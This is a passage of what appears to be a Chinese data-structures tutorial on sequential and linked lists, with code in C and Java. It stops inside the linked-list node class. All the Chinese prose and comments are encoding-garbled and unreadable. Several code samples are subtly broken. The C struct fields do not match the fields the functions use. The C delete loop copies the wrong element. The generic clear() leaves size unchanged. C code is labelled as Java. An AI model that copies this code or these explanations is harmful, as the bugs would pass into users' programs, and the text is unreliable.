çº¿æ§è¡¨çç±»åå®ä¹\n\nçº¿æ§è¡¨æ¯ä¸ä¸ªååçµæ´»çæ°æ®ç»æï¼é¿åº¦å¯æ ¹æ®éæ±å¢å æç¼©ç­ï¼è¿å¯ä»¥å¯¹çº¿æ§è¡¨çåç´ è¿è¡è®¿é®ãå é¤ãæå¥ç­æä½ãä»¥ä¸ç»åºçº¿æ§è¡¨çæ½é²æ°æ®ç±»åå®ä¹ï¼\n\n\n\n\n# çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°ï¼Cè¯­è¨çï¼\n\n\n# çº¿æ§è¡¨çé¡ºåºå­å¨è¡¨ç¤º\n\n> çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºæçæ¯ä½¿ç¨ ä¸ç»è¿ç»­å°åçå­å¨ååå­å¨çº¿æ§è¡¨çåç´ ï¼è¿ä¸ªè¡¨ç¤ºä¹ç§°ä¸ºé¡ºåºå­å¨ç»ææèé¡ºåºæ åãéå¸¸è¿ç§å­å¨ç»æççº¿æ§è¡¨ç§°ä¸º é¡ºåºè¡¨ãé»è¾ä¸ç¸é»çåç´ å¨ç©çæ¬¡åºä¸ä¹æ¯ç¸é»ç\n\nåè®¾ä¸ä¸ªåç´ å ç¨lä¸ªå­å¨ç©ºé´ï¼å¹¶ä¸å ç¨çç¬¬ä¸ä¸ªå­å¨å°åä½ä¸ºåç´ å­å¨çèµ·å§ä½ç½®ãåçº¿æ§è¡¨ä¸­ç¬¬i+1ä¸ªåç´ çå­å¨ä½ç½®åç¬¬iä¸ªåç´ çå­å¨ä½ç½®ä¹é´çå³ç³»å¦ä¸ï¼\n\nLOC(ai+1) = LOC(ai) + l\n\n\n1\n\n * çº¿æ§è¡¨çç¬¬ä¸ä¸ªåç´ çèµ·å§ä½ç½®LOC(a1)ï¼éå¸¸ç§°ä¸ºçº¿æ§è¡¨çèµ·å§ä½ç½®æèåºå°åã\n * æ¯ä¸ªåç´ çå­å¨ä½ç½®ååç´ å¨çº¿æ§è¡¨ä¸­çä½åºææ­£æ¯\n * åªè¦ç¡®å®èµ·å§ä½ç½®ååç´ å¤§å°ï¼ä»»æåç´ çä½ç½®é½å¯éæºå­å\n * å æ­¤çº¿æ§è¡¨çé¡ºåºå­å¨ç»ææ¯ä¸ç§ éæºå­åçå­å¨ç»æã\n\n\n\nå¨é«çº§ç¨åºè®¾è®¡è¯­è¨ä¸­çæ°ç»æçç±»ä¼¼çéæºå­åç¹æ§ï¼å æ­¤éå¸¸ä½¿ç¨æ°æ®æè¿°æ°æ®ç»æä¸­çé¡ºåºå­å¨ç»æãCè¯­è¨ä¸­ççº¿æ§è¡¨å¯æè¿°å¦ä¸ï¼\n\n#define MAXSIZE 100\ntypedef struct{\n  ElemType * elem;\n  int length;\n}SqList;\n\n\n1\n2\n3\n4\n5\n\n * æ°ç»ç©ºé´å¤§å°ä¸ºMAXSIZEéè¿åå§åå¨æåéå¾å°ï¼åå§åä¹åElemæéæåé¡ºåºè¡¨çåºå°åã\n * åç´ ç±»åELemTypeå¯ä»¥æ ¹æ®å®éç±»åè¿è¡å®ä¹ãå¯ä»¥ä¸ºint ãfloatç»è®°æ¬æ°æ®ç±»åæèstrutçç»æä½ç±»åã\n * lengthè¡¨ç¤ºé¡ºåºè¡¨ä¸­å­å¨çåç´ ä¸ªæ°ã\n\n\n# é¡ºåºè¡¨çåºæ¬æä½\n\n# 0. åå§å\n\n> é¡ºåºè¡¨çåå§åæä½æ¯æé ä¸ä¸ªç©ºçé¡ºåºè¡¨ã\n\nvoid InitList(SqList *list){\n  // åéç©ºé´\n  list->elem = (ElemType *)malloc((size_t)(sizeof(ElemType) * DEFAULT_CAPACITY));\n  if (list->elem == NULL){\n    printf("%s\\n",strerror(errno));\n    exit(-1);\n  }\n\n  // åå§ååæ°\n  list->size = 0;\n  list->capacity = DEFAULT_CAPACITY;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 1. é¡ºåºè¡¨æ©å®¹\n\n> å½é¡ºåºè¡¨å­å¨ç©ºé´ä¸è¶³æ¶ï¼éè¦å¯¹é¡ºåºè¡¨è¿è¡æ©å®¹ï¼è¿éå®ä¸ºæ©å®¹ä¸¤åå¤§å°ã\n\nvoid SeqListExpand(SqList *list){\n  list->elem = (ElemType *)realloc(list->elem,2 * list->capacity * sizeof(ElemType));\n  if (list->elem == NULL){\n    error();\n  }\n  list->capacity = 2 * list->capacity;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 2. åå¼\n\n> åå¼æä½æ¯æ ¹æ®æå®åç´ çä½ç½®åºå·iï¼è·åé¡ºåºè¡¨ä¸­çç¬¬iä¸ªåç´ çå¼ã\n\nElemType GetItem(SqList *list,int index){\n  if (index < 0 || index >= list->size){\n    // é¿åº¦å¼å¸¸æ¥é\n    printf("%s\\n", strerror(errno));\n    exit(-2);\n  }\n  return list->elem[index];\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 3. æ¥æ¾\n\n> æ¥æ¾åç´ æ¯æ ¹æ®æå®åç´ å¼eï¼æ¥æ¾é¡ºåºè¡¨ä¸­ä¸ç»å®eç¸ç­çåç´ çç¬¬ä¸ä¸ªä½ç½®ï¼æååè¿åä½ç½®åºå·ï¼å¤±è´¥åè¿å-1ã\n\nint LocateELem(SqList *list,ElemType elemType){\n  for (int i = 0; i < list->size; i++) {\n    if (elemType == list->elem[i]){\n      return i;\n    }\n  }\n  return -1;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå½å¨é¡ºåºè¡¨ä¸­æ¥æ¾ä¸ä¸ªåç´ æ¶ï¼éè¦ä»å¤´å¼å§éåé¡ºåºè¡¨ï¼æ¯è¾çæ¬¡æ°ååå³ä¸ºåç´ å¨çº¿æ§è¡¨ä¸­çä½ç½®ã\n\nå¨æ¥æ¾æ¶ï¼ä¸ºäºç¡®å®åç´ å¨é¡ºåºè¡¨ä¸­çä½ç½®ï¼éè¦åç»å®çå¼è¿è¡æ¯è¾çæ°æ®åç´ ä¸ªæ°çææå¼ç§°ä¸ºæ¥æ¾ç®æ³é¿å¹æ¥æ¾æåæ¶çå¹³åæ¥æ¾é¿åº¦ï¼ASLï¼ã\n\nåè®¾piæ¯æ¥æ¾ç¬¬iä¸ªåç´ çæ¦çï¼Ciä¸ºæ¾å°è¡¨ä¸­å¶å³é®å­ä¸ç»å®çç¸ç­çç¬¬iä¸ªè®°å½æ¶ï¼åç»å®å¼å·²ç»æ¯è¾è¿çå³é®å­ä¸ªæ°ï¼åå¨é¿åº¦ä¸ºnççº¿æ§è¡¨ä¸­ï¼æ¥æ¾æåæ¶å¹³åæ¥æ¾é¿åº¦ä¸ºï¼\n\n\n\nä»æ¥æ¾çç®æ³è¿ç¨å¯ç¥ï¼å½æ¥æ¾çåç´ æ¯ç¬¬ä¸ä¸ªè®°å½æ¶ï¼åªéè¦æ¯è¾ä¸æ¬¡ï¼å½æ¥æ¾çåç´ ä¸ºæåä¸ä¸ªè®°å½æ¶ï¼åéè¦æ¯è¾næ¬¡ãåè®¾æ¯ä¸ªåç´ çæ¥æ¾æ¦çç¸ç­ï¼å³pi = 1/nï¼åå¯ä»¥åç®ä¸ºï¼\n\n\n\nå¾åºé¡ºåºè¡¨çå¼æ¥æ¾å¹³åæ¶é´å¤æåº¦ä¸ºO(n)\n\n# 4. æå¥\n\n> çº¿æ§è¡¨çæå¥æä½æ¶å¨è¡¨çæå®iä½ç½®æå¥ä¸ä¸ªæ°çåç´ eï¼å¹¶å°é¿åº¦ä¸ºnççº¿æ§è¡¨åä¸ºn+1ã\n\nElemType ListInsert(SqList *list, int index, ElemType elem){\n  // å¤æ­ç´¢å¼æ¯å¦æ­£ç¡®\n  if (index < 0 || index > list->size){\n    error();\n  }\n\n  // å¤æ­å®¹éæ¯å¦åè¶³\n  if (list->size == list->capacity){\n    SeqListExpand(list);\n  }\n  //æå¥åç´ \n  // æ«å°¾æå¥\n  if(index == list->size){\n    list->elem[index] = elem;\n    list-> size ++;\n    return NULL;\n  }else{\n    for (int i = list->size ; i > index ; i--) {\n      list->elem[i] = list->elem[i - 1];\n    }\n    ElemType oldElem = list->elem[index];\n    list->elem[index] = elem;\n    list->size ++;\n    return oldElem;\n  }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\næ ¹æ®åæï¼ç®æ³æå¥æ¶çå¹³åæ¶é´å¤æåº¦ä¸ºO(n)ã\n\n# 5. å é¤æå®ä½ç½®çåç´ \n\n> å é¤åç´ æ¯æå°æå®ç´¢å¼ä½ç½®çåç´ å é¤ï¼å¹¶å°è¯¥ä½ç½®åæ¬çåç´ è¿åã\n\nElemType ListDelete(SqList *list,int index){\n  if (index < 0 || index >= list->size){\n    error();\n  }\n  // å é¤æåä¸ä¸ªåç´ \n  if (index == list->size - 1){\n    ElemType oldElem = list->elem[index];\n    list->elem[index] = NULL;\n    list->size --;\n    return oldElem;\n  } else{\n    ElemType oldElem = list->elem[index];\n    for (int i = index; i < list->size - 1; ++i) {\n      list->elem[i] = list->elem[index + 1];\n    }\n    list->size --;\n    return oldElem;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\né¡ºåºè¡¨çå é¤ç®æ³å¹³åæ¶é´å¤æåº¦ä¸º:O(n)ã\n\nä»¥ä¸å°±æ¯Cè¯­è¨å®ç°çé¡ºåºè¡¨çå³é®æä½ï¼ä¸é¢ä½¿ç¨Javaçæ¬çå®ç°ã\n\n\n# çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°ï¼Javaè¯­è¨çï¼\n\n> Javaè¯­è¨ççé¡ºåºè¡¨ç¸å¯¹äºCè¯­è¨ççå¿½ç¥äºåºå±çä¸äºæä½ãåæ³æ´ä¸ºç®åï¼åæ¶Javaè¯­è¨çArrayListå®éä¸å°±æ¯å¯¹é¡ºåºè¡¨çå®ç°ã\n\nä»¥ä¸æ¯Javaçæ¬çå¨é¨ä»£ç (ä¸ä½¿ç¨èå)ï¼\n\npackage com.pwddd.list;\n\npublic class ArrayList {\n\n  private static final int ELEMENT_NOT_FOUND = -1;\n  private int[] elems;\n  private int size;\n  private static final int DEFAULT_CAPACITY = 10;\n\n  /**\n     * æå®å¤§å°è¿è¡åå§å\n     *\n     * @param capacity èªå®ä¹å¤§å°\n     */\n  public ArrayList(int capacity) {\n    capacity = capacity > DEFAULT_CAPACITY ? capacity : DEFAULT_CAPACITY;\n    elems = new int[capacity];\n  }\n\n\n  /**\n     * é»è®¤åå§å\n     */\n  public ArrayList() {\n    this(DEFAULT_CAPACITY);\n  }\n\n  /**\n     * æ¸é¤ææåç´ \n     */\n  public void clear() {\n    // å¯¹äºintç±»åèè¨ï¼åªéè¦è®©size=0 æ æ³è®¿é®å³å¯\n    // å¦ææ¯å¯¹è±¡ç±»ååä¸ºäºè®©åå¾æ¶éå¨å·¥ä½ï¼åéè¦è®¾ç½®ä¸ºnull\n    size = 0;\n  }\n\n  /**\n     * åç´ çæ°é\n     *\n     * @return åç´ çæ°é\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * æ¯å¦ä¸ºç©º\n     *\n     * @return æ¯å¦ä¸ºç©º\n     */\n  public boolean isEmpty() {\n    return size == 0;\n  }\n\n  /**\n     * æ¯å¦åå«æä¸ªåç´ \n     *\n     * @param element æå®åç´ \n     * @return æ¯å¦åå«\n     */\n  public boolean contains(int element) {\n    return indexOf(element) != ELEMENT_NOT_FOUND;\n  }\n\n  /**\n     * æ·»å åç´ å°å°¾é¨\n     *\n     * @param element æå®çåç´ \n     */\n  public void add(int element) {\n    add(size,element);\n  }\n\n  /**\n     * è·åindexä½ç½®çåç´ \n     *\n     * @param index  æå®çç´¢å¼ä½ç½®\n     * @return ç´¢å¼ä½ç½®çåç´ \n     */\n  public int get(int index) {\n    checkIndex(index);\n    return elems[index];\n  }\n\n  /**\n     * è®¾ç½®indexä½ç½®çåç´ \n     *\n     * @param index æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     * @return åæ¥çåç´ Öµ\n     */\n  public int set(int index, int element) {\n    checkIndex(index);\n    int oldElem = elems[index];\n    elems[index] = element;\n    return oldElem;\n  }\n\n  /**\n     * å¨indexä½ç½®æå¥ä¸ä¸ªåç´ \n     *\n     * @param index æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     */\n  public void add(int index, int element) {\n    checkIndexForAdd(index);\n    ensureCapacity(size + 1);\n    for (int i = size; i > index ; i --){\n      elems[i] = elems[i-1];\n    }\n    elems[index] = element;\n    size ++;\n  }\n\n  /**\n     * å é¤indexä½ç½®çåç´ \n     *\n     * @param index æå®ç´¢å¼ä½ç½®\n     * @return å é¤ä½ç½®ä¹åçåç´ \n     */\n  public int remove(int index) {\n    checkIndex(index);\n    int oldElem = elems[index];\n    for (int i = index + 1; i < size ; i ++){\n      elems[i - 1] = elems[i];\n    }\n    size --;\n    return oldElem;\n  }\n\n  /**\n     * æ¥çåç´ çç´¢å¼\n     *\n     * @param element æå®æ¥æ¾çåç´ \n     * @return åç´ çç´¢å¼\n     */\n  public int indexOf(int element) {\n    for (int i = 0; i < size ; i++){\n      if (elems[i] == element){\n        return i;\n      }\n    }\n    return ELEMENT_NOT_FOUND;\n  }\n\n  /**\n     * ä¿è¯è¦æcapacityçå®¹é\n     *\n     * @param capacity å½åå®¹é\n     */\n  private void ensureCapacity(int capacity) {\n    int oldCapacity = elems.length;\n    if (oldCapacity >= capacity) return;\n    int newCapacity = oldCapacity + (oldCapacity >> 1);\n    int[] newElems = new int[newCapacity];\n    for (int i = 0; i < elems.length; i ++){\n      newElems[i] = elems[i];\n    }\n    elems = newElems;\n  }\n\n  private void checkIndex(int index){\n    if (index < 0 || index >= size){\n      throw new IndexOutOfBoundsException("åç´ ç´¢å¼è¶ç--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n\n  private void checkIndexForAdd(int index){\n    if (index < 0 || index > size){\n      throw new IndexOutOfBoundsException("åç´ ç´¢å¼è¶ç--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n\n\næ·»å èåçJavaå®ç°æ¹å¼ï¼\n\npackage com.pwddd.list;\n\n\npublic class ArrayList<E> {\n\n  private static final int ELEMENT_NOT_FOUND = -1;\n  private E[] elems;\n  private int size;\n  private static final int DEFAULT_CAPACITY = 10;\n\n  /**\n     * æå®å¤§å°è¿è¡åå§å\n     *\n     * @param capacity èªå®ä¹å¤§å°\n     */\n  public ArrayList(int capacity) {\n    capacity = capacity > DEFAULT_CAPACITY ? capacity : DEFAULT_CAPACITY;\n    elems = (E[]) new Object[capacity];\n  }\n\n\n  /**\n     * é»è®¤åå§å\n     */\n  public ArrayList() {\n    this(DEFAULT_CAPACITY);\n  }\n\n  /**\n     * æ¸é¤ææåç´ \n     */\n  public void clear() {\n    // å¯¹äºintç±»åèè¨ï¼åªéè¦è®©size=0 æ æ³è®¿é®å³å¯\n    // å¦ææ¯å¯¹è±¡ç±»ååä¸ºäºè®©åå¾æ¶éå¨å·¥ä½ï¼åéè¦è®¾ç½®ä¸ºnull\n    //        size = 0;\n    for (int i = 0; i < size; i++){\n      elems[i] = null;\n    }\n  }\n\n  /**\n     * åç´ çæ°é\n     *\n     * @return åç´ çæ°é\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * æ¯å¦ä¸ºç©º\n     *\n     * @return æ¯å¦ä¸ºç©º\n     */\n  public boolean isEmpty() {\n    return size == 0;\n  }\n\n  /**\n     * æ¯å¦åå«æä¸ªåç´ \n     *\n     * @param element æå®åç´ \n     * @return æ¯å¦åå«\n     */\n  public boolean contains(E element) {\n    return indexOf(element) != ELEMENT_NOT_FOUND;\n  }\n\n  /**\n     * æ·»å åç´ å°å°¾é¨\n     *\n     * @param element æå®çåç´ \n     */\n  public void add(E element) {\n    add(size,element);\n  }\n\n  /**\n     * è·åindexä½ç½®çåç´ \n     *\n     * @param index  æå®çç´¢å¼ä½ç½®\n     * @return ç´¢å¼ä½ç½®çåç´ \n     */\n  public E get(int index) {\n    checkIndex(index);\n    return elems[index];\n  }\n\n  /**\n     * è®¾ç½®indexä½ç½®çåç´ \n     *\n     * @param index æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     * @return åæ¥çåç´ Öµ\n     */\n  public E set(int index, E element) {\n    checkIndex(index);\n    E oldElem = elems[index];\n    elems[index] = element;\n    return oldElem;\n  }\n\n  /**\n     * å¨indexä½ç½®æå¥ä¸ä¸ªåç´ \n     *\n     * @param index æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     */\n  public void add(int index, E element) {\n    checkIndexForAdd(index);\n    ensureCapacity(size + 1);\n    for (int i = size; i > index ; i --){\n      elems[i] = elems[i-1];\n    }\n    elems[index] = element;\n    size ++;\n  }\n\n  /**\n     * å é¤indexä½ç½®çåç´ \n     *\n     * @param index æå®ç´¢å¼ä½ç½®\n     * @return å é¤ä½ç½®ä¹åçåç´ \n     */\n  public E remove(int index) {\n    checkIndex(index);\n    E oldElem = elems[index];\n    for (int i = index + 1; i < size ; i ++){\n      elems[i - 1] = elems[i];\n    }\n    elems[--size] = null;\n    return oldElem;\n  }\n\n  /**\n     * æ¥çåç´ çç´¢å¼\n     *\n     * @param element æå®æ¥æ¾çåç´ \n     * @return åç´ çç´¢å¼\n     */\n  public int indexOf(E element) {\n    if (element == null) return -1;\n    for (int i = 0; i < size ; i++){\n      if (element.equals(elems[i])){\n        return i;\n      }\n    }\n    return ELEMENT_NOT_FOUND;\n  }\n\n  /**\n     * ä¿è¯è¦æcapacityçå®¹é\n     *\n     * @param capacity å½åå®¹é\n     */\n  private void ensureCapacity(int capacity) {\n    int oldCapacity = elems.length;\n    if (oldCapacity >= capacity) return;\n    int newCapacity = oldCapacity + (oldCapacity >> 1);\n    E[] newElems = (E[]) new Object[newCapacity];\n    for (int i = 0; i < elems.length; i ++){\n      newElems[i] = elems[i];\n    }\n    elems = newElems;\n  }\n\n  private void checkIndex(int index){\n    if (index < 0 || index >= size){\n      throw new IndexOutOfBoundsException("åç´ ç´¢å¼è¶ç--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n\n  private void checkIndexForAdd(int index){\n    if (index < 0 || index > size){\n      throw new IndexOutOfBoundsException("åç´ ç´¢å¼è¶ç--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n\n\n\n# çº¿æ§è¡¨çé¾å¼è¡¨ç¤ºåå®ç°ï¼Javaè¯­è¨çï¼\n\n\n# åé¾è¡¨çå®ä¹åè¡¨ç¤º\n\n> çº¿æ§è¡¨çé¾å¼å­å¨ç»æçç¹ç¹æ¯ï¼ä½¿ç¨ä¸ç»äººæçå­å¨ååå­å¨çº¿æ§è¡¨ä¸­çæ°æ®åç´ ï¼å¯ä»¥æ¯è¿ç»­çï¼ä¹å¯ä»¥æ¯ä¸è¿ç»­çã\n\nä¸ºäºè¡¨ç¤ºæ¯ä¸ªåç´ åå¶åç»§åç´ ä¹é´çå³ç³»ï¼é¤äºå­å¨æ°æ®æ¬èº«çä¿¡æ¯ä¹å¤ï¼è¿éè¦ä¸ä¸ªå­å¨åç»§åç´ ä½ç½®çåºåãæä»¬éå¸¸è®²ï¼æ°æ®ååæéåãæéåä¸­å­å¨çä¿¡æ¯ä¸ºæéæèé¾ãnä¸ªé¾ç»åæä¸ä¸ªé¾è¡¨ç§°ä¸ºçº¿æ§è¡¨ã(a1,a2,â¦â¦an)\n\n**æ ¹æ®é¾è¡¨çæéçä¸ªæ°ãæ¹åãè¿æ¥æ¹å¼ç­ï¼é¾è¡¨åå¯ä»¥åä¸ºï¼åé¾è¡¨ãå¾ªç¯é¾è¡¨ãååé¾è¡¨ãäºåé¾è¡¨ãåå­é¾è¡¨ãé»æ¥è¡¨ãé»æ¥å¤éè¡¨ç­ã**åé¾è¡¨ãå¾ªç¯é¾è¡¨åååé¾è¡¨ç¨äºå®ç°çº¿æ§è¡¨çé¾å¼å­å¨ç»æãå¶ä»å½¢å¼å¤ç¨äºå®ç°æ æèå¾ç­éçº¿æ§çç»æã\n\nå¨Javaä¸­ï¼åé¾è¡¨çå­å¨ç»æå¯ä»¥å®ä¹ä¸ºï¼\n\ntypedef int ElemType;\n\ntypedef struct {\n  ElemType data;\n  struct LNode *next;\n}LNode, *LinkList;\n\n\n1\n2\n3\n4\n5\n6\n\n\nä¸è¬æåµä¸ï¼å¾å¾å¨åé¾è¡¨çç¬¬ä¸ä¸ªèç¹ä¹åè®¾ç½®ä¸ä¸ªèç¹ï¼ç§°ä¸ºå¤´èç¹ãè¿éæä»¬åä¸è¦æ·»å å¤´ç»ç¹ã\n\n * å¤´èç¹æ¯å¨é¦åç»ç¹ä¹åéè®¾çä¸ä¸ªç»ç¹ï¼æéåæåé¦åç´ ç»ç¹ã\n * å¤´æéæ¯æåé¾è¡¨ä¸­ç¬¬ä¸ä¸ªç»ç¹çæéï¼è¥é¾è¡¨è®¾ç½®æå¤´ç»ç¹ï¼åå¤´æéæåå¤´ç»ç¹ã\n\nç»é¾è¡¨å¢å å¤´ç»ç¹çå¥½å¤ï¼\n\n * ä¾¿äºé¦åèç¹çå¤çã\n * ä¾¿äºç©ºè¡¨åéç©ºè¡¨çç»ä¸å¤çã\n\n\n# åé¾è¡¨çåºæ¬æä½çå®ç°\n\nåé¡ºåºè¡¨ç»ä¸æ¥å£ï¼\n\npackage com.pwddd;\n\npublic interface List<E> {\n\n  public static final int ELEMENT_NOT_FOUND = -1;\n\n  /**\n     * æ¸é¤ææåç´ \n     */\n  void clear();\n\n\n  /**\n     * åç´ çæ°é\n     *\n     * @return åç´ çæ°é\n     */\n  int size();\n\n  /**\n     * æ¯å¦ä¸ºç©º\n     *\n     * @return æ¯å¦ä¸ºç©º\n     */\n  boolean isEmpty();\n\n  /**\n     * æ¯å¦åå«æä¸ªåç´ \n     *\n     * @param element æå®åç´ \n     * @return æ¯å¦åå«\n     */\n  boolean contains(E element);\n\n  /**\n     * æ·»å åç´ å°å°¾é¨\n     *\n     * @param element æå®çåç´ \n     */\n  void add(E element);\n\n  /**\n     * è·åindexä½ç½®çåç´ \n     *\n     * @param index æå®çç´¢å¼ä½ç½®\n     * @return ç´¢å¼ä½ç½®çåç´ \n     */\n  E get(int index);\n\n  /**\n     * è®¾ç½®indexä½ç½®çåç´ \n     *\n     * @param index   æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     * @return åæ¥çåç´ Öµ\n     */\n  E set(int index, E element);\n\n  /**\n     * å¨indexä½ç½®æå¥ä¸ä¸ªåç´ \n     *\n     * @param index   æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     */\n  void add(int index, E element);\n\n\n  /**\n     * å é¤indexä½ç½®çåç´ \n     *\n     * @param index æå®ç´¢å¼ä½ç½®\n     * @return å é¤ä½ç½®ä¹åçåç´ \n     */\n  E remove(int index);\n\n  /**\n     * æ¥çåç´ çç´¢å¼\n     *\n     * @param element æå®æ¥æ¾çåç´ \n     * @return åç´ çç´¢å¼\n     */\n  int indexOf(E element);\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\nå®ä¹æ½è±¡ç±»ï¼å°é¡ºåºè¡¨åé¾è¡¨å¬å±é¨åæ½ååºæ¥ï¼\n\npackage com.pwddd;\n\npublic abstract class AbstractList<E> implements List<E> {\n  protected int size;\n  /**\n     * åç´ çæ°é\n     *\n     * @return åç´ çæ°é\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * æ¯å¦ä¸ºç©º\n     *\n     * @return æ¯å¦ä¸ºç©º\n     */\n  public boolean isEmpty() {\n    return size == 0;\n  }\n\n  /**\n     * æ¯å¦åå«æä¸ªåç´ \n     *\n     * @param element æå®åç´ \n     * @return æ¯å¦åå«\n     */\n  public boolean contains(E element) {\n    return indexOf(element) != ELEMENT_NOT_FOUND;\n  }\n\n  /**\n     * æ·»å åç´ å°å°¾é¨\n     *\n     * @param element æå®çåç´ \n     */\n  public void add(E element) {\n    add(size,element);\n  }\n\n  protected void checkIndex(int index){\n    if (index < 0 || index >= size){\n      throw new IndexOutOfBoundsException("åç´ ç´¢å¼è¶ç--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n\n  protected void checkIndexForAdd(int index){\n    if (index < 0 || index > size){\n      throw new IndexOutOfBoundsException("åç´ ç´¢å¼è¶ç--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\nåé¾è¡¨çå®ç°ï¼\n\npackage com.pwddd.linkedlist;\n\nimport com.pwddd.AbstractList;\n\npublic class LinkedList<E> extends AbstractList<E> {\n\n  private Node<E> first;\n\n  @Override\n  public void clear() {\n    size = 0;\n    first = null;\n  }\n\n  @Override\n  public E get(int index) {\n    return node(index).element;\n  }\n\n  @Override\n  public E set(int index, E element) {\n    Node<E> node = node(index);\n    E old = node.element;\n    node.element = element;\n    return old;\n  }\n\n  @Override\n  public void add(int index, E element) {\n    if (index == 0){\n      first = new Node<E>(element,first);\n    }else {\n      Node<E> preNode = node(index - 1);\n      preNode.next = new Node<>(element,preNode.next);\n    }\n    size ++;\n  }\n\n  @Override\n  public E remove(int index) {\n    checkIndex(index);\n    Node<E> node = first;\n    if (index == 0){\n      first = first.next;\n    }else {\n      Node<E> prev = node(index - 1);\n      node = prev.next;\n      prev.next = node.next;\n    }\n    size--;\n    return node.element;\n  }\n\n  @Override\n  public int indexOf(E element) {\n    if (element == null){\n      Node<E> node = first;\n      for (int i = 0; i < size; i++) {\n        if (node.element == null) return i;\n        node = node.next;\n      }\n    }else {\n      Node<E> node = first;\n      for (int i = 0; i < size; i++) {\n        if (element.equals(node.element)){\n          return i;\n        }\n        node = node.next;\n      }\n    }\n    return ELEMENT_NOT_FOUND;\n  }\n\n\n  private Node<E> node(int index){\n    checkIndex(index);\n    Node<E> node = first;\n    for (int i = 0; i < index; i++) {\n      node = node.next;\n    }\n    return node;\n  }\n\n\n  private static class Node<E> {\n    E element;\n    Node<E> next;\n\n    public Node(E element, Node<E> next) {\n      this.element = element;\n      this.next = next;\n    }\n  